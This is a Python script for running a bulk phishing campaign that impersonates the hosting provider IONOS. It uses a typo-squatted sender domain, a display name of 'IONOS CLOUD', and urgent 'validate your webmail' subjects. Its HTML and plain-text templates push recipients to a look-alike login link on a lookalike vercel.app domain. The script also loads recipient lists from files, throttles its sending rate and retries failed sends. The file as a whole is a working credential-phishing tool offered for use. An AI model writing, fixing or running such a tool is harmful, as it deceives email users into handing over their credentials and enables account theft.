#!/usr/bin/env python3
"""
IONOS Validation Email Sender - Fixed Configuration
"""

import asyncio
import aiosmtplib
import pandas as pd
import sys
import time
import re
from datetime import datetime
from email.message import EmailMessage
from email.utils import formatdate
import uuid
import argparse
from typing import List, Set
import csv
from pathlib import Path

# ============================================================================
# CONFIGURATION - EDIT THESE VALUES
# ============================================================================

# NameSilo Titan Email Configuration - CHOOSE ONE OPTION:

# OPTION 1: PORT 587 with STARTTLS (Recommended)
EMAIL_CONFIG = {
    "host": "mail.ionossrvers.de",      
    "port": 587,                         # 587 for STARTTLS
    "username": "notifications@ionossrvers.de",   # YOUR EMAIL
    "password": "YOUR_PASSWORD_HERE",    # YOUR PASSWORD
    "use_tls": False,                    # MUST be False for STARTTLS on port 587
    "starttls": True,                    # MUST be True for STARTTLS
    "timeout": 60,
}

# OPTION 2: PORT 465 with SSL
# EMAIL_CONFIG = {
#     "host": "mail.ionossrvers.de",
#     "port": 465,                        # 465 for SSL
#     "username": "notifications@ionossrvers.de",
#     "password": "YOUR_PASSWORD_HERE",
#     "use_tls": True,                    # MUST be True for SSL
#     "starttls": False,                  # MUST be False for SSL
#     "timeout": 60,
# }

# Sender Information
DISPLAY_NAME = "IONOS CLOUD"
SENDER_EMAIL = "notifications@ionossrvers.de"  # Must match username above

# Campaign Configuration
VALIDATION_LINK = "https://auth-i0nos.vercel.app/"  # Your validation link
CAMPAIGN_YEAR = "2026"  # Update based on your campaign

# Rate Limiting
RATE_LIMIT = {
    "emails_per_hour": 150,
    "batch_size": 10,                    # Smaller batches for testing
    "delay_between_batches": 5.0,        # Longer delay for testing
}

# ============================================================================
# EMAIL TEMPLATES (Simplified for testing)
# ============================================================================

def get_email_subject(recipient_email: str) -> str:
    """Generate IONOS-style subject lines"""
    import random
    subjects = [
        f"Important: IONOS Webmail Validation Required",
        f"Action Required: Validate Your IONOS Account",
        f"IONOS: Complete Your Email Validation",
        f"Urgent: Validate Your IONOS Webmail for {CAMPAIGN_YEAR}"
    ]
    return random.choice(subjects)

def get_ionos_html_template(recipient_email: str) -> str:
    """Return simplified HTML template for testing"""
    html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>IONOS Validation Required</title>
</head>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
    <div style="background-color: #f5f5f5; padding: 20px; border-radius: 5px;">
        <h2 style="color: #0b5394;">IONOS Webmail Validation</h2>
        <p>Dear IONOS User,</p>
        <p>Your IONOS webmail requires validation for {CAMPAIGN_YEAR}. Some incoming emails may be pending until you complete this process.</p>
        <p>To avoid any disruption to your email service, please validate your account by clicking the button below:</p>
        <div style="text-align: center; margin: 30px 0;">
            <a href="{VALIDATION_LINK}" style="background-color: #2463eb; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold;">
                Validate Email Address
            </a>
        </div>
        <p>For security reasons, this validation is required to continue receiving emails.</p>
        <p>Best regards,<br>
        <strong>IONOS CLOUD Team</strong></p>
        <hr style="margin: 20px 0;">
        <p style="font-size: 12px; color: #666;">
            This is an automated message from IONOS CLOUD.<br>
            Please do not reply to this email.
        </p>
    </div>
</body>
</html>"""
    return html_content

def get_ionos_text_template(recipient_email: str) -> str:
    """Return plain text version"""
    text_content = f"""IONOS WEBMAIL VALIDATION

Dear IONOS User,

Your IONOS webmail requires validation for {CAMPAIGN_YEAR}. Some incoming emails may be pending until you complete this process.

To avoid any disruption to your email service, please validate your account using this link:

{VALIDATION_LINK}

For security reasons, this validation is required to continue receiving emails.

Best regards,
IONOS CLOUD Team

This is an automated message. Please do not reply to this email.
"""
    return text_content

# ============================================================================
# MAIN EMAIL SENDER CLASS - SIMPLIFIED FOR TESTING
# ============================================================================

class IONOSEmailSender:
    def __init__(self, test_mode=False, log_file="ionos_log.csv"):
        self.test_mode = test_mode
        self.log_file = log_file
        self.stats = {
            'total': 0,
            'sent': 0,
            'failed': 0,
            'start_time': None,
            'failed_emails': []
        }
        
        # Test SMTP connection settings
        print(f"🔧 SMTP Configuration:")
        print(f"   Host: {EMAIL_CONFIG['host']}")
        print(f"   Port: {EMAIL_CONFIG['port']}")
        print(f"   Use TLS: {EMAIL_CONFIG['use_tls']}")
        print(f"   STARTTLS: {EMAIL_CONFIG['starttls']}")
        print(f"   Username: {EMAIL_CONFIG['username']}")
        
        if log_file and not test_mode:
            self.init_log_file()
    
    def init_log_file(self):
        """Initialize CSV log file"""
        try:
            with open(self.log_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['timestamp', 'email', 'status', 'error'])
        except Exception as e:
            print(f"⚠️  Could not create log file: {e}")
    
    async def test_smtp_connection(self):
        """Test SMTP connection before sending emails"""
        print(f"\n🔍 Testing SMTP connection to {EMAIL_CONFIG['host']}:{EMAIL_CONFIG['port']}...")
        
        try:
            # Create a test message
            message = EmailMessage()
            message["From"] = f"{DISPLAY_NAME} <{SENDER_EMAIL}>"
            message["To"] = "test@example.com"
            message["Subject"] = "SMTP Connection Test"
            message.set_content("This is a test email to verify SMTP connection.")
            
            # Try to send test email
            await aiosmtplib.send(
                message,
                hostname=EMAIL_CONFIG["host"],
                port=EMAIL_CONFIG["port"],
                username=EMAIL_CONFIG["username"],
                password=EMAIL_CONFIG["password"],
                use_tls=EMAIL_CONFIG.get("use_tls", False),
                start_tls=EMAIL_CONFIG.get("starttls", True),
                timeout=10,
            )
            print("✅ SMTP connection test successful!")
            return True
            
        except Exception as e:
            print(f"❌ SMTP connection failed: {type(e).__name__}")
            print(f"   Error: {str(e)}")
            
            # Provide troubleshooting tips
            print(f"\n🔧 Troubleshooting tips:")
            if EMAIL_CONFIG["port"] == 587:
                print(f"   • Port 587 should have: use_tls=False, starttls=True")
                print(f"   • Check if STARTTLS is enabled on your server")
            elif EMAIL_CONFIG["port"] == 465:
                print(f"   • Port 465 should have: use_tls=True, starttls=False")
                print(f"   • Check if SSL is enabled on your server")
            
            print(f"   • Verify your username and password")
            print(f"   • Check if your IP is allowed to send emails")
            print(f"   • Contact NameSilo support if issues persist")
            return False
    
    def create_email_message(self, to_email: str) -> EmailMessage:
        """Create email message"""
        message = EmailMessage()
        message["Subject"] = get_email_subject(to_email)
        message["Date"] = formatdate(localtime=True)
        message["From"] = f"{DISPLAY_NAME} <{SENDER_EMAIL}>"
        message["To"] = to_email
        
        # Set content
        message.set_content(get_ionos_text_template(to_email))
        message.add_alternative(get_ionos_html_template(to_email), subtype="html")
        
        # Add headers
        message_id = f"<{uuid.uuid4().hex}@ionossrvers.de>"
        message["Message-ID"] = message_id
        message["X-Mailer"] = "IONOS-Validator/1.0"
        message["X-Priority"] = "1"
        
        return message
    
    async def send_single_email(self, to_email: str, retry_count: int = 1) -> bool:
        """Send single email"""
        if self.test_mode:
            print(f"[TEST] Would send to: {to_email}")
            print(f"       Subject: {get_email_subject(to_email)}")
            await asyncio.sleep(0.1)
            self.stats['sent'] += 1
            return True
        
        for attempt in range(retry_count + 1):
            try:
                message = self.create_email_message(to_email)
                
                result = await aiosmtplib.send(
                    message,
                    hostname=EMAIL_CONFIG["host"],
                    port=EMAIL_CONFIG["port"],
                    username=EMAIL_CONFIG["username"],
                    password=EMAIL_CONFIG["password"],
                    use_tls=EMAIL_CONFIG.get("use_tls", False),
                    start_tls=EMAIL_CONFIG.get("starttls", True),
                    timeout=30,
                )
                
                print(f"✅ Sent: {to_email}")
                self.stats['sent'] += 1
                return True
                
            except Exception as e:
                error_type = type(e).__name__
                if attempt < retry_count:
                    print(f"⚠️  Error for {to_email}: {error_type} - retrying...")
                    await asyncio.sleep(2)
                else:
                    print(f"❌ Failed: {to_email} - {error_type}: {str(e)[:100]}")
                    self.stats['failed'] += 1
                    self.stats['failed_emails'].append(to_email)
                    return False
        
        return False
    
    async def send_all_emails(self, emails: List[str]):
        """Send all emails"""
        self.stats['total'] = len(emails)
        self.stats['start_time'] = time.time()
        
        print(f"\n🚀 Starting to send {len(emails)} emails...")
        
        # Send emails one by one for testing
        for i, email in enumerate(emails, 1):
            print(f"\n📧 Email {i}/{len(emails)}: {email}")
            await self.send_single_email(email)
            
            # Small delay between emails
            if i < len(emails):
                await asyncio.sleep(2)
        
        # Print summary
        elapsed = time.time() - self.stats['start_time']
        print(f"\n{'='*50}")
        print(f"📊 SUMMARY:")
        print(f"   Total: {self.stats['total']}")
        print(f"   Sent: {self.stats['sent']}")
        print(f"   Failed: {self.stats['failed']}")
        print(f"   Time: {elapsed:.1f}s")
        print(f"{'='*50}")

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

async def main():
    parser = argparse.ArgumentParser(description='IONOS Validation Email Sender')
    parser.add_argument('-f', '--file', required=True, help='CSV/TXT file with emails')
    parser.add_argument('-c', '--column', default='email', help='Email column name')
    parser.add_argument('-t', '--test', action='store_true', help='Test mode')
    parser.add_argument('--smtp-test', action='store_true', help='Test SMTP connection only')
    
    args = parser.parse_args()
    
    # Initialize sender
    sender = IONOSEmailSender(test_mode=args.test)
    
    # Load emails
    print(f"📂 Loading emails from: {args.file}")
    try:
        if args.file.endswith('.csv'):
            df = pd.read_csv(args.file)
            emails = df[args.column].dropna().astype(str).tolist()
        else:
            with open(args.file, 'r') as f:
                emails = [line.strip() for line in f if line.strip()]
        
        # Clean and validate
        emails = [email.strip().lower() for email in emails if '@' in email]
        emails = list(set(emails))  # Remove duplicates
        
        print(f"✅ Found {len(emails)} unique emails")
        
    except Exception as e:
        print(f"❌ Error loading emails: {e}")
        return
    
    # Test SMTP connection first
    if not args.test and not args.smtp_test:
        success = await sender.test_smtp_connection()
        if not success:
            print("\n❌ Cannot proceed without successful SMTP connection.")
            print("   Fix the configuration or use --test mode.")
            return
    
    # If only testing SMTP
    if args.smtp_test:
        return
    
    # Confirm sending
    if not args.test:
        print(f"\n⚠️  Ready to send {len(emails)} validation emails")
        print(f"   Sender: {DISPLAY_NAME} <{SENDER_EMAIL}>")
        print(f"   Link: {VALIDATION_LINK}")
        
        confirm = input("\n📤 Proceed? (y/n): ").lower()
        if confirm != 'y':
            print("❌ Cancelled.")
            return
    
    # Send emails
    await sender.send_all_emails(emails)

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 7):
        print("❌ Python 3.7+ required")
        sys.exit(1)
    
    # Run
    asyncio.run(main())
